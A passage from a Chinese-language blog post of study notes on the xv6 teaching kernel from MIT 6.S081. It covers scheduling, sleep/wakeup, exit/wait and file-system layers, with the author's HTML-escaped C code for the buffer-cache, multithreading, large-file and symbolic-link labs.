acquiresleep(&amp;b-&gt;lock);        return b;      &#125;  // steal free buf  for (int j=i, cnt=0;cnt &lt; TBL_SIZE;j=((j+1)%TBL_SIZE),cnt++) &#123;    if (i != j)      acquire(&amp;tbl[j].lock);    for(b = tbl[j].head.next; b != &amp;tbl[j].head; b = b-&gt;next)&#123;      if(b-&gt;refcnt == 0)&#123;        b-&gt;dev = dev;        b-&gt;blockno = blockno;        b-&gt;valid = 0;        b-&gt;refcnt = 1;        b-&gt;tbl_index = i;        struct buf *prev = b-&gt;prev, *next = b-&gt;next;        if (prev) &#123;          prev-&gt;next = next;        &#125; else &#123;          tbl[j].head.next = next;        &#125;        if (next) &#123;          next-&gt;prev = prev;        &#125;        insert_buf(&amp;tbl[i].head, b);        if (i != j)          release(&amp;tbl[j].lock);        release(&amp;tbl[i].lock);        acquiresleep(&amp;b-&gt;lock);        return b;      &#125;    &#125;    if (i != j)      release(&amp;tbl[j].lock);  &#125;  release(&amp;tbl[i].lock);  panic(&quot;bget: no buffers&quot;);&#125;\n剩下的就是把bcache改成用到對的list\nstruct buf &#123;  int tbl_index;  // ...&#125;;\nch7\nxv6 的sleep 和 wakeup 機制會進行切換\n這會發生在進程等待設備或管道 I/O\n等待子進程退出\n在 sleep 系統調用中等待\nxv6 週期性地強制切換，以應對長時間的計算進程。\n首先，如何從一個進程切換到另一個進程？\n第二，如何對用戶進程透明的強制切換？ (用定時器中斷來驅動上下文切換)\n第三，許多 CPU 可能會在進程間並發切換，需要設計一個鎖來避免競爭。\n第四，當進程退出時，必須釋放進程的內存和其他資源，但它自己不能做到這一切，因為它不能釋放自己的內核棧，同時又在使用內核棧。\n第五，多核機器的每個內核必須記住它正在執行的進程，這樣系統調用就會修改相應進程的內核狀態。\n最後，sleep 和 wakeup 允許一個進程放棄 CPU，並睡眠等待事件，並允許另一個進程喚醒第一個進程。\n需要注意一些競爭可能會使喚醒丟失!!\ncoperative thread: sleep, wakeup, ctx switch, scheduler\n\nctx switch\nxv6 調度器在每個 CPU 上有一個專門的線程(保存的寄存器和棧)，因為調度器在舊進程的內核棧上執行是不安全的\n棧指針和 pc 被保存和恢復，意味著 CPU 將切換棧和正在執行的代碼\nSwtch(kernel/swtch.S:3)只保存 callee-saved 寄存器，caller-saved 寄存器由調用的 C\n代碼保存在堆棧上(如果需要)\n\n它不保存 pc。\n當swtch 返回時，它返回到被恢復的 ra 寄存器所指向的指令，也就是新線程之前調用 swtch的指令。\n此外，它還會在新線程的棧上返回。\nscheduler\n其實就是在沒有process在跑的時候選一個跑\n\nmain會call，scheduler\n之後scheduler挑一個proc (RR)\nctx switch\n\n到ctx switch時還沒release lock!!\n\n對於上下文切換來說，有必要打破這個約定，因為 p-&gt;lock 保護了進程的狀態和 context 字段上的不變式(invariant)，而這些不變式在 swtch 中執行時為 false。\n\n\n都是與mycpu換ctx!!\n\n所以可以看成mycpu()-&gt;context就是正在跑的cpu的state，也是proc的state(不是RUNNABLE之類的，是執行的狀態)\n\n\n\n\n\np-&gt;lock??\n可以這樣理解調度代碼結構，它執行一組關於進程的不變式，並且每當這些不變式為False 時，就持有 p-&gt;lock。\n一個不變式是，\n\n如果一個進程正在運行，定時器中斷的 yield 必須能夠安全地切換進程；\n\n這意味著 CPU 寄存器必須持有進程的寄存器值（即 swtch 沒有將它們移到上下文中）\n並且 c-&gt;proc 必須指向該進程。\n另一個不變式是，\n\n\n如果一個進程是RUNNABLE 的，那麼對於一個空閒的 CPU 調度器來說，運行它必須是安全的\n\n這意味著\n\n（1）p-&gt;context 必須擁有進程的寄存器（i.e., 它們實際上並不在真實的寄存器中）\n（2）沒有 CPU 在進程的內核棧上執行\n（3）也沒有 CPU 的 c-&gt;proc 指向進程\n\n請注意，當 p-&gt;lock被持有時，這些屬性往往不為真。\n\n\n\n\n\n\n\n維護上述不變式的原因：xv6 經常在一個線程中獲取 p-&gt;lock，然後在另一個線程中釋放\n直到成功轉移state之前都要hold lock\nmycpu and myproc\nXv6 為每個 CPU 維護了一個 cpu 結構體(kernel/proc.h:22)，它記錄了當前在該 CPU 上\n運行的進程(如果有的話)，為 CPU 的調度線程保存的寄存器，以及管理中斷禁用所需的嵌套\n自旋鎖的計數。\nXv6 確保每個 CPU 的 hartid 在內核中被存儲在該 CPU 的 tp 寄存器中\nUsertrapret 將 tp 寄存器保存在 trampoline 頁中，因為用戶進程可能會修改 tp 寄存器\n當從用戶空間進入內核時，uservec 會恢復保存的 tp(kernel/trampoline.S:70)。編譯器保證永遠不使用 tp 寄存器。\n如果 RISC-V 允許 xv6 直接讀取當前的 hartid 會更方便\ncpuid 和 mycpu 的返回值很容易錯：\n如果定時器中斷，導致線程讓出 CPU，然後轉移到不同的 CPU 上，之前返回的值將不再正確。\n為了避免這個問題，xv6 要求調用者禁用中斷，只有在使用完返回的 cpu 結構後才啟用中斷\nmyproc(kernel/proc.c:68)函數返回當前 CPU 上運行的進程的 proc 指針。\nmyproc 禁用中斷，調用 mycpu，從 cpu 中獲取當前進程指針(c-&gt;proc)，然後啟用中斷。\nmyproc不用lock防嗎??\n當下指到的proc是對的\nSleep\n為了確保進入sleep前的state改變不會被打斷 (eg: semaphore的P)\nsleep會先hold proc的lock，才去\n\nrelease 前一個lock\n改proc狀態\n\np-&gt;chan = chan;\np-&gt;state = SLEEPING;\n\n\nsched\n\n這邊會看到一個有趣的事，與scheduler一樣，p-&gt;lock沒有release!!\nwakeup\n把所有聽在同一個lock(semaphore)的proc的state設定成runnable\n虛假喚醒\nwakeup會把所有proc，叫醒，但只有一個proc可以拿到lock\n所以對其他proc而言，這是虛假喚醒!!\nexit &amp; wait\nexit: 把file close，把proc設定成ZOMBIE，sched\nwait: 掃child proc，看有沒有ZOMBIE，有就設定成UNUSED；沒有就sleep\n父進程和子進程的 wait 和 exit，以及 exit 和 exit 之間可能出現競爭和死鎖的情況\n此 xv6 的所有鎖都必須遵守相同的鎖順序（父進程的鎖，然後是子進程的鎖），以避免死鎖\npreemptive thread\ntime interrupt時做sched\nvoidusertrap(void)&#123;    // ...    // give up the CPU if this is a timer interrupt.    if(which_dev == 2)        yield();&#125;\ntrace: trapframe &amp; context\n看回來這張圖\n\nsched都是在kernel mode發生，所以不用換pagetable\nsched是換手，也就是我已經做了差不多了，所以會主動call函數，之後只要回來我這邊就好，\n但是換回來函數的執行環境(callee-save)會壞掉，所以要存；\n用於計算用的參數就，沒有用(做了差不多了，或是說已經存在stack上了(會call函數c會處理))，就不用管\ntrap是中斷，所以之後要在原本的地方跑(還沒做完)，因此要保留原本的pc，不然沒辦法接回去；\n同時要保留caller-save，trap可以看成call函數，但沒有c的幫忙，所以這要自己存；\n剩下是ctx switch，所以callee-save也要存\ntrace: exit &amp; wait\n\n\nexit:\n\n把opend file關一關\n把parent設定成init\n把自己state設定成ZOMBIE\n\n\n\nwait\n\n掃過整個proc，找符合下面兩個條件的proc\n\nparent是caller的proc\nstate是ZOMBIE\n\n\n找到就\n\nacquire child的lock (wait!!)\n拉proc的return值(xstate)\nfreeproc\n\n\n沒找到\n\nstate不是ZOMBIE\n\nparent sleep\n\n\n沒有proc認caller做parent\n\n報錯\n\n\n\n\n\n\n\n這裡就可以回答一個經典問題，為什麼要有ZOMBIE?\n因為把proc回收分成\n\n關file: exit\nfree mem: wait\n\n而在wait可以拿到proc的return值(所以不能free mem)\n但我們需要一個方式表示proc準備好被回收，所以有ZOMBIE\n但為什麼叫ZOMBIE?\n這我真的不懂，不能叫EXITED嗎?\nLab Multithreading\nph\n練手用\npthread_mutex_t table_locks[NBUCKET];static void insert(int key, int value, struct entry **p, struct entry *n)&#123;  // ...  // is the key already present?  struct entry *e = 0;  pthread_mutex_lock(table_locks+i);  for (e = table[i]; e != 0; e = e-&gt;next) &#123;    // ...    insert(key, value, &amp;table[i], table[i]);  &#125;  pthread_mutex_unlock(table_locks+i);&#125;\nbarrier\n這個就有趣了\n一開始會想只要一個出去把counter設成0就好，但這樣while的部分就會出事，可能有人出不來\n這樣我們挑最後一個去reset計數器，但這樣也會有問題，如果說最後一個一直被hang住，之後中間有跑比較快的進來，這樣就不是barrier\n所以鎖要保護兩個條件\n\n進來時要確認上一輪的不在這裡了\n人數到了就能release，最後一個要去reset計數器\n\nstatic void barrier()&#123;  static int no_one_here = 1, in_room = 0;  pthread_mutex_lock(&amp;bstate.barrier_mutex);  while (!no_one_here)    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);  pthread_cond_broadcast(&amp;bstate.barrier_cond);  bstate.nthread++, in_room++;  while (bstate.nthread != nthread)    pthread_cond_wait(&amp;bstate.barrier_cond, &amp;bstate.barrier_mutex);  if (in_room-- == nthread)    no_one_here = 0, bstate.round++;  if (in_room == 0)    no_one_here = 1, bstate.nthread = 0;  pthread_cond_broadcast(&amp;bstate.barrier_cond);  pthread_mutex_unlock(&amp;bstate.barrier_mutex);&#125;\nuthread\n這題就去抄context與swtch就好\n但重點是，\n\n要怎麼到thread的function去?\n\ntrap是改pc，因為我們不會再回來trap中\n但thread可以多次來回，所以需要一個自動回到對的位置的機制，ra\n\nthread的記憶體要放在哪?\n回想當初init怎麼做，讓之後的c可以跑?\n從stack0放一個PGSIZE，指到sp\n\nvoid thread_create(void (*func)()) &#123;  // ...  t-&gt;ctx.ra = (uint64)func; // HERE  t-&gt;ctx.sp = (uint64)t-&gt;stack + STACK_SIZE-1;&#125;\nch8\n\n\n\n磁盤層在 virtio 磁盤上讀寫塊\n\n\n緩存層(bio.c)緩存磁盤塊，並同步訪問它們，確保一個塊只能同時被內核中的一個進程訪問\n\nbuffer 緩存是一個由 buffer 組成的雙端鍊錶\nbget根據devid、sector找buffer\nbread/bwrite讀寫buffer\nbrelse釋放sleep lock\n\nbread拿鎖\n\n\n\n\n\n日誌層(log.c)允許上層通過事務更新多個磁盤塊，並確保在崩潰時，磁盤塊是原子更新的（即全部更新或不更新）\n\n日誌由一個 header 塊組成，後面是一連串的更新塊副本（日誌塊）。\n\nheader 塊包含一個扇區號數組，\n\n每個扇區號都對應一個日誌塊，header 還包含日誌塊的數量\n\n\n\n\n日誌系統可以將多個系統調用的寫操作累積到一個事務中\n\n一次提交可能涉及多個完整系統調用的寫入\n為了避免一個系統調用被分裂到不同的事務中，只有在沒有文件系統相關的系統調用正在進行時，日誌系統才會提交\n\n\nXv6 在磁盤上劃出固定的空間來存放日誌。在一個事務中，系統調用所寫的塊總數必須 適應這個空間的大小\n\n系統調用寫入的日誌大小必須小於日誌空間的大小\n\nXv6 的 write 系統調用將大的寫操作分解成多個小的寫操作，以適應在日誌空間的大小\nunlink 不會引起問題，因為 xv6 文件系統只使用一個位圖塊\n\n\n日誌系統只會在確定了系統調用的寫操作可以適應剩餘日誌空間之後，才會開始執行該系統調用\n\n\n\n\n\ninode 層(fs.c)將一個文件都表示為一個 inode，每個文件包含一個唯一的 i-number 和一些存放文件數據的塊\n\nballoc 申請一個新的磁盤塊: iterate bitmap\nbfree 釋放一個塊: clear flag on block\n磁盤上的inode\n\n文件的大小和數據塊號的列表\n磁盤上的 inode 被放置磁盤的一個連續區域\n\n每一個 inode 的大小都是一樣的\n\n所以，給定一個數字 n，很容易找到磁盤上的第 n 個 inode\n\n\ndinode定義了磁盤上的 inode\n\n包含一個 size 和一個塊號數組\n\n\n開始的 NDIRECT 個數據塊放置在數組中的前NDIRECT 個條目中，這些塊被稱為直接塊\n接下來的 NINDIRECT 個數據塊並沒有放置在inode 中，而是被存放在叫做間接塊的數據塊中\n\n\nBmap 返回 inode ip 的第 bn 個數據塊的磁盤塊號。如果 ip 沒有第 bn 個的數據塊，bmap 就會分配一個 (mmap!!)\n\n\n\n\n\n\nmem中的inode\n\n了磁盤上 inode 的副本以及內核中需要的其他信息\n結構體 inode (kernel/file.h:17)是磁盤 dinode 的拷貝\n\nref 字段為指向 inode 的指針的數量，如果引用數量減少到零，內核就會從內存中丟棄這個 inode\niget 和 iput 函數引用和釋放 inode，並修改引用計數\n四種鎖\n\nicache.lock 保證了一個 inode 在緩 存只有一個副本，以及緩存 inode 的 ref 字段計數正確\n每個內存中的 inode 都有一個包含 sleep-lock 的鎖字段，它保證了可以獨占訪問 inode 的其他字段（如文件長度）以及 inode 的文件或目錄內容塊的\n一個 inode 的 ref 如果大於 0，則會使系統將該 inode 保留在緩存 中，而不會重用該 inode\n每個 inode 都包含一個 nlink 字段(在磁盤上，緩存時會復 製到內存中)，該字段統計鏈接該 inode 的目錄項的數量；如果一個 inode 的鏈接數大於零， xv6 不會釋放它\n\n\n\n\n\n\n\n\n\n目錄層(fs.c)將實現了一種特殊的 inode，被稱為目錄，其包含一個目錄項序列，每個目錄項由文件名稱和 i-number 組成\n\n函數 dirlookup 在一個目錄中搜索一個帶有給定名稱的條目\n函數 dirlink 會在當前目錄 dp 中創建一個新的目錄項\n查找路徑名會對每一個節點調用一次 dirlookup\nNamex首先確定路徑解析從哪裡開始\n\n如果路徑以斜線開頭，則從根目錄開始解析\n否則，從當前目錄開始解析。\n\n\n然後它使用 skipelem 來遍歷路徑中的每個元素\n\n\n\nfile(file.c)\n\n系統中所有打開的文件都保存在一個全局文件表中，即 ftable\n\n文件表的功能有:\n\n分配文件(filealloc)\n創建重複引用(fileup)\n釋放引用(fileclose)\n讀寫數據(fileeread和filewrite)。\n\n\n\n\n\n\n\n\nsuperblock，\n它包含了文件系統的元數據（以塊為單位的文件系統大小、數據塊的數量、inode 的數量和日誌中的塊數）\n位圖塊(bitmap)，記錄哪些數據塊在使用\nballoc與kalloc與malloc的差別\nkalloc: 直接丟一個page\nmalloc: 從現有的mem拉一段va出來，如果沒空間了就sbrk加大\n* sbrk: growproc -&gt; uvmalloc -&gt; kalloc -&gt; mappages\n* mappages: 把從kalloc拿到的page與加到pagetable\nballoc: 與kalloc很像，就是直接丟一個block出來\n* 但要處理log!!\n* 去trace誰是空的\n* mem用list(或AVL)\n* disk用bitmap\ntrace: how to read/write a file\n\nfileread\n\nreadi\n\nbread拿buf，bmap算偏移(在hdd上的addr)\ncopyout\n\n\n\n\nfilewrite\n\nbegin_op\n\nwritei\n\nbread拿buf，bmap算偏移(在hdd上的addr)\ncopyin\nlog_write\n\n記錄到log\n\n\n\n\n\n\nend_op\n\ncommit\n\nwrite_log\n\n寫buf到disk\n\n\nwrite_head\n\ncommit log\n\n\n\n\n\n\n\n\n\nLab File system\nbig file\n就是在block再放一個table，之後再多做一次\nstatic uintbmap(struct inode *ip, uint bn)&#123;  uint addr, *a;  struct buf *bp;  if(bn &lt; NDIRECT)&#123;    if((addr = ip-&gt;addrs[bn]) == 0)      ip-&gt;addrs[bn] = addr = balloc(ip-&gt;dev);    return addr;  &#125;  bn -= NDIRECT;  if (bn &lt; BLOCKS) &#123;    // Load indirect block, allocating if necessary.    if((addr = ip-&gt;addrs[NDIRECT]) == 0)      ip-&gt;addrs[NDIRECT] = addr = balloc(ip-&gt;dev);\t@@ -400,6 +401,30 @@ bmap(struct inode *ip, uint bn)    brelse(bp);    return addr;  &#125;  bn -= BLOCKS;  if (bn &lt; NINDIRECT) &#123;     // double indirect    int i = bn/BLOCKS, j = bn%BLOCKS;    if((addr = ip-&gt;addrs[NDIRECT+1]) == 0)      ip-&gt;addrs[NDIRECT+1] = addr = balloc(ip-&gt;dev);    bp = bread(ip-&gt;dev, addr);    a = (uint*)bp-&gt;data;    if((addr = a[i]) == 0)&#123;      a[i] = addr = balloc(ip-&gt;dev);      log_write(bp);    &#125;    brelse(bp);    // query addr from int[]&#x27;s data    bp = bread(ip-&gt;dev, addr);    a = (uint*)bp-&gt;data;    if((addr = a[j]) == 0) &#123;      a[j] = addr = balloc(ip-&gt;dev);      log_write(bp);    &#125;    brelse(bp);    return addr;  &#125;  panic(&quot;bmap: out of range&quot;);&#125;\nvoiditrunc(struct inode *ip)&#123;  int i, j;  struct buf *bp;  uint *a;  for(i = 0; i &lt; NDIRECT; i++)&#123;    if(ip-&gt;addrs[i])&#123;      bfree(ip-&gt;dev, ip-&gt;addrs[i]);      ip-&gt;addrs[i] = 0;    &#125;  &#125;  if(ip-&gt;addrs[NDIRECT])&#123;    bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT]);    a = (uint*)bp-&gt;data;    for(j = 0; j &lt; BLOCKS; j++)&#123;      if(a[j])        bfree(ip-&gt;dev, a[j]);    &#125;    brelse(bp);    bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT]);    ip-&gt;addrs[NDIRECT] = 0;  &#125;  uint *b;  struct buf *bp2;  if(ip-&gt;addrs[NDIRECT+1])&#123;    bp = bread(ip-&gt;dev, ip-&gt;addrs[NDIRECT+1]);    a = (uint*)(bp-&gt;data); // int[]    for(i = 0; i &lt; BLOCKS; i++)&#123;      if (a[i]) &#123;        bp2 = bread(ip-&gt;dev, a[i]);        b = (uint*)(bp2-&gt;data);        for (j = 0; j &lt; BLOCKS; j++)          if(b[j])            bfree(ip-&gt;dev, b[j]);        brelse(bp2);        bfree(ip-&gt;dev, a[i]);      &#125;    &#125;    brelse(bp);    bfree(ip-&gt;dev, ip-&gt;addrs[NDIRECT+1]);    ip-&gt;addrs[NDIRECT+1] = 0;  &#125;  ip-&gt;size = 0;  iupdate(ip);&#125;\nsymbol link\n一個有path的檔案\nsyscall要先生出檔案，把path寫進去\nuint64sys_symlink(void)&#123;  int n;  char target[MAXPATH], path[MAXPATH];  struct inode *ip;  if((n = argstr(0, target, MAXPATH)) &lt; 0 || argstr(1, path, MAXPATH) &lt; 0)    return -1;  begin_op();  ip = create(path, T_SYMLINK, 0, 0);  for (int i=0, r = 0, n1 = 0, off = 0;i &lt; n &amp;&amp; r == n1; i += r)&#123;    n1 = n - i;    if ((r = writei(ip, 0, (uint64)target + i, off, n1)) &gt; 0)      off += r;  &#125;  ip-&gt;nlink = 1;  iunlockput(ip);  end_op();  return 0;&#125;\nopen要能處理symbol link，與原本的檔案\n如果遇到其他symbol link還要繼續follow\n抄原本的open，加symbol link的處理，最後遞迴\nuint64 real_open(char path[MAXPATH], int omode, int follow) &#123;  int fd;  struct file *f;  struct inode *ip;  if(omode &amp; O_CREATE)&#123;    ip = create(path, T_FILE, 0, 0);    if(ip == 0)&#123;      return -1;    &#125;  &#125; else &#123;    if((ip = namei(path)) == 0)&#123;      return -1;    &#125;    ilock(ip);    if(ip-&gt;type == T_DIR &amp;&amp; omode != O_RDONLY)&#123;      iunlockput(ip);      return -1;    &#125;  &#125;  if(ip-&gt;type == T_DEVICE &amp;&amp; (ip-&gt;major &lt; 0 || ip-&gt;major &gt;= NDEV))&#123;    iunlockput(ip);    return -1;  &#125;  if (ip-&gt;type == T_SYMLINK) &#123;    if (!(omode &amp; O_NOFOLLOW)) &#123;      char target[MAXPATH];      if (follow &gt; FOLLOW_DEPS || readi(ip, 0, (uint64)target, 0, MAXPATH) &lt; 0) &#123;        iunlockput(ip);        return -1;      &#125;      iunlock(ip);      return real_open(target, omode, follow+1);    &#125;  &#125;  if((f = filealloc()) == 0 || (fd = fdalloc(f)) &lt; 0)&#123;    if(f)      fileclose(f);    iunlockput(ip);    return -1;  &#125;  if(ip-&gt;type == T_DEVICE)&#123;    f-&gt;type = FD_DEVICE;    f-&gt;major = ip-&gt;major;  &#125; else &#123;    f-&gt;type = FD_INODE;    f-&gt;off = 0;  &#125;  f-&gt;ip = ip;  f-&gt;readable = !(omode &amp; O_WRONLY);  f-&gt;writable = (omode &amp; O_WRONLY) || (omode &amp; O_RDWR);  if((omode &amp; O_TRUNC) &amp;&amp; ip-&gt;type == T_FILE)&#123;    itrunc(ip);  &#125;  iunlock(ip);  return fd;&#125;uint64sys_open(void)&#123;  char path[MAXPATH];  int omode;  int n;  if((n = argstr(0, path, MAXPATH)) &lt; 0 || argint(1, &amp;omode) &lt; 0)    return -1;  begin_op();  uint64 ret = real_open(path, omode, 0);  end_op();  return ret;&#125;\nRef\n可以在google找到很多其他人的做法，都值得參考\nMIT6.S081 操作系统工程中文翻译\nxv6-book-2020-Chinese\n","categories":["System","Small project","OS"]}]